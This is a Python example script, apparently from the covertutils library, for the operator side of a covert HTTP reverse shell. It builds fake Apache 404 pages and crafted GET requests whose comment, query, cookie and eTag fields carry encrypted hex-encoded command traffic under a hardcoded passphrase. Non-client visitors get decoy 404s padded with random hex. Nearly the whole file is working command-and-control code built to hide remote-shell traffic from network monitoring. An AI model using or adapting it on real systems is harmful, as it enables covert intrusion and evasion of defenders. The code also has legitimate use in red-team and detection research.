#!/usr/bin/env python

#			 Disclaimer!
#	 This code is not an optimal HTTP reverse shell!
# It is created to introduce as many aspects of 'covertutils' as possible.
# There are muuuuuch better ways to implement a reverse HTTP shell using this package,
# using many Python helpers like SimpleHTTPServer.
# In this file the HTTP requests/responses are crafted in socket level to display
# the concept of 'StegoOrchestrator' class and network wrapper functions

from covertutils.handlers import ResponseOnlyHandler
from covertutils.orchestration import StegoOrchestrator
from covertutils.datamanipulation import asciiToHexTemplate
from covertutils.prompts import PrintPrompt

from time import sleep
from os import urandom
import random
import string
import sys

import socket
from threading import Thread

#============================== HTTP Steganography part ===================

resp_ascii = '''HTTP/1.1 404 Not Found
Date: Sun, 18 Oct 2012 10:36:20 GMT
Server: Apache/2.2.14 (Win32)
Content-Length: 363
Connection: Closed
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html>
<head>
   <title>404 Not Found</title>
</head>
<body>
   <h1>Not Found</h1>
   <p>The requested URL was not found on this server.</p>
</body>
<!-- Reference Code: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-->
</html>
'''
resp_templ = asciiToHexTemplate( resp_ascii )

req_ascii = '''GET /search.php?q=~~~~~~~~?userid=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ HTTP/1.1
Host: {0}
Cookie: SESSIOID=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
eTag: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

'''		# 2 new lines terminate the HTTP Request
req_templ = asciiToHexTemplate( req_ascii )

#		Create the StegoOrchestrator configuration string
stego_config = '''
X:_data_:\n\n

resp = """%s"""
req = """%s"""
''' % ( resp_templ, req_templ )

#==========================================================================


#============================== Handler Overriding part ===================

# It is an HTTP Server, so it has to send data only when requested.
# Hence the use of the 'ResponseOnlyHandler' which sends data only when 'onMessage()' is hit with the self.request_data message
class MyHandler ( ResponseOnlyHandler ) :	#
	# Overriding original onMessage method to send a response in any case - not only 'ResponseOnlyHandler.request_data' message arrives
	def onMessage( self, stream, message ) :
		# If the Parent Class would respond (the message was a request), don't bother responding
		responded = super( MyHandler, self ).onMessage( stream, message )
		if not responded :	# If the message was real data (not 'ResponseOnlyHandler.request_data' string), the Parent Class didn't respond
			self.queueSend("X", 'main');	# Make it respond anyway with 'X' (see Client)
			responded = super( MyHandler, self ).onMessage( stream, message )
			assert responded == True		# This way we know it responsed!
		if message != self.request_data :
			print
			print message					# If the message was real data print it

	def onChunk( self, stream, message ) :
		if message : return					# If this chunk is the last and message is assembled let onMessage() handle it
		# print "[*] Got a Chunk"
		self.onMessage( 'main', self.request_data )	# If this is a message chunk, treat it as a 'request_data' message

	def onNotRecognised( self ) :
		# print "[!]< Unrecognised >"			# If someone that isn't the client sent an HTTP Request
		to_respond = resp_ascii				# create a new response from template (manually)
		while '~' in to_respond :			# Fill it with random data
			random_hex_digit = random.choice(string.hexdigits.upper())
			to_respond = to_respond.replace('~', random_hex_digit, 1)
		send( to_respond )					# Sent it
		# This way all random connections will get the same 404 page with random hex in the comments.
		#	Good luck decrypting that...
#==========================================================================


#============================== Networking part =========================
# The networking is handled by Python API. No 'covertutils' code here...

addr = ("0.0.0.0", int( sys.argv[1]) )		# The Listening Address tuple

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	# Listening socket
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)	# Free the socket object directly after process finishes
server_socket.bind( addr )		# Handling Networking
server_socket.listen(5)			# independently of covertutils

# HTTP Servers work like:
#	Client (Socket Opens)  Server
#	Client ------SYN-----> Server
#	Client <---SYN-ACK---- Server
#	Client ------ACK-----> Server

#	Client (HTTP Request)  Server
#	Client --------------> Server
#	Client (HTTP Response) Server
#	Client <-------------- Server

#	Client (Socket Close)  Server
#	Client <-----FIN------ Server
#	Client ----FIN-ACK---> Server
#	Client <-----ACK------ Server

# As this happens for every HTTP Request/Response the 'send' and 'recv' functions
# use spin-locks to block and recognise when they can tranfer data.
# 'send' and 'recv' are wrappers for Handler object networking. Covertutils is network agnostic


client = None						# Globally define the client socket

def recv () :
	global client
	while not client : continue	# Wait until there is a client
	ret = ''
	while not ret :			# Block until all data is received
 		ret = client.recv( 2048 )
	return ret			# Return the received data


def send( raw ) :
	global client
	while not client : continue	# Wait until there is a client
	client.send( raw )			# Send the data through the socket
	client.shutdown(socket.SHUT_RDWR) #	Terminate the Socket
#==========================================================================


#=============================Handler Creation============================

passphrase = "App1e5&0raNg3s"	# This is used to generate encryption keys
orch = StegoOrchestrator( passphrase,
							stego_config = stego_config,
							main_template = "resp",		# The template to be used
							hex_inject = True )			# Inject data in template in hex mode

handler = MyHandler( recv, send, orch )	# Instantiate the Handler Object using the network wrappers


def serveForever() :
	global client
	while True :				# Make it listen `hard`
		client_new, client_addr = server_socket.accept()
		client = client_new

server_thread = Thread ( target = serveForever )
server_thread.daemon = True
server_thread.start()

#==========================================================================


#============================== Prompt Design part ========================
prompt = PrintPrompt( handler )
prompt.start()

#==========================================================================

#	Magic!
